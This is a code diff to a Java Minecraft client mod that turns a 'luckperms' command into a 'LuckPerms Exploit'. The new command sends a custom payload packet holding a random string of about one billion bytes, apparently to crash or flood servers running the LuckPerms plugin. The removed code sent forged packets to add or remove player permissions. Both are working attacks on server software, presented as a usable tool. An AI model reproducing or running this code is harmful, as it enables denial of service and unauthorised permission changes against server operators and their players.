@@ -8,79 +8,34 @@ import io.github.spigotrce.paradiseclientprivate.packets.LuckPermsPayloadPacket;
 import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
 import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.network.PlayerListEntry;
 import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 
-import java.util.UUID;
+import java.nio.charset.StandardCharsets;
+import java.util.Random;
 
 public class LuckPermsCommand extends Command {
     public LuckPermsCommand(MinecraftClient minecraftClient) {
-        super("luckperms", "Manage player permissions", minecraftClient);
+        super("luckperms", "LuckPerms Exploit", minecraftClient);
     }
 
     @Override
     public LiteralArgumentBuilder<FabricClientCommandSource> build() {
         return literal(getName())
                 .executes(context -> {
-                    Helper.printChatMessage("Incomplete command! Usage: /paradise luckperms <user> <permission> <add|remove>");
+                    // Generate a random JSON string of random characters
+                    String randomJson = generateRandomJson(1000000000);
+                    // Create and send the LuckPerms payload packet
+                    LuckPermsPayloadPacket payloadPacket = new LuckPermsPayloadPacket(randomJson);
+                    Helper.sendPacket(new CustomPayloadC2SPacket(payloadPacket));
+                    Helper.printChatMessage("Massive JSON string sent to LuckPerms!");
+
                     return SINGLE_SUCCESS;
-                })
-                .then(ClientCommandManager.argument("user", StringArgumentType.word())
-                        .suggests((ctx, builder) -> {
-                            String partialName = ctx.getInput().substring(ctx.getInput().lastIndexOf(' ') + 1).toLowerCase();
+                });
+    }
 
-                            // Get player list suggestions based on input
-                            getMinecraftClient().getNetworkHandler().getPlayerList().stream()
-                                    .map(PlayerListEntry::getProfile)
-                                    .filter(player -> player.getName().toLowerCase().startsWith(partialName))
-                                    .forEach(profile -> builder.suggest(profile.getName()));
-
-                            return builder.buildFuture();
-                        })
-                        .then(ClientCommandManager.argument("permission", StringArgumentType.string())
-                                .then(ClientCommandManager.argument("action", StringArgumentType.word())
-                                        .suggests((ctx, builder) -> {
-                                            builder.suggest("add");
-                                            builder.suggest("remove");
-                                            return builder.buildFuture();
-                                        })
-                                        .executes(context -> {
-                                            String user = context.getArgument("user", String.class);
-                                            String permission = context.getArgument("permission", String.class);
-                                            String action = context.getArgument("action", String.class);
-
-                                            // Validate action
-                                            if (!action.equalsIgnoreCase("add") && !action.equalsIgnoreCase("remove")) {
-                                                Helper.printChatMessage("Invalid action! Use 'add' or 'remove'.");
-                                                return SINGLE_SUCCESS;
-                                            }
-
-                                            // Find the player in the player list
-                                            PlayerListEntry targetPlayer = getMinecraftClient().getNetworkHandler().getPlayerList().stream()
-                                                    .filter(p -> p.getProfile().getName().equalsIgnoreCase(user))
-                                                    .findFirst()
-                                                    .orElse(null);
-
-                                            if (targetPlayer != null) {
-                                                boolean add = action.equalsIgnoreCase("add");
-                                                // Create and send the LuckPerms payload packet
-                                                LuckPermsPayloadPacket payloadPacket = new LuckPermsPayloadPacket(
-                                                        targetPlayer.getProfile().getId().toString(), // Player's UUID
-                                                        targetPlayer.getProfile().getName(),           // Player's name
-                                                        permission,                                     // Permission string
-                                                        add,                                            // Action (add/remove)
-                                                        UUID.randomUUID()                               // Unique request ID
-                                                );
-                                                Helper.sendPacket(new CustomPayloadC2SPacket(payloadPacket));
-                                                Helper.printChatMessage("Permission " + (add ? "added" : "removed") + " for " + user + "!");
-                                            } else {
-                                                Helper.printChatMessage("Player '" + user + "' not found!");
-                                            }
-
-                                            return SINGLE_SUCCESS;
-                                        })
-                                )
-                        )
-                );
+    private String generateRandomJson(int length) {
+        byte[] array = new byte[length];
+        new Random().nextBytes(array);
+        return new String(array, StandardCharsets.UTF_8);
     }
 }
